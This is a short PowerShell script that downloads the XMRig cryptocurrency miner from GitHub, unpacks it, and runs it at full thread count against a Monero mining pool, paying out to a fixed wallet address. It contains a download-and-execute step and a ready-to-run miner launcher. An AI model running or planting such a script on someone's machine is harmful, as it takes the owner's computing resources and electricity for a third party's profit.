$algo = "rx/0"
$pool = "gulf.moneroocean.stream:10001"
$user = "45MBTQ27xo1LJmAi6sNFTyZhgTdoF45XCRsLUtmL7Lo376nNuxcaSxAa3JUkUV4xHEVSpsEA6nwL5S28g1fCa1RwPfXpwnH"
$pass = "Windows"
$threads = (Get-CimInstance -ClassName Win32_Processor).NumberOfLogicalProcessors

Invoke-WebRequest -Uri "https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-msvc-win64.zip" -OutFile "xmrig.zip"
Expand-Archive xmrig.zip

.\xmrig\xmrig-6.21.3\xmrig.exe -a $algo -o $pool -u $user -p $pass --cpu-priority 5 -t $threads
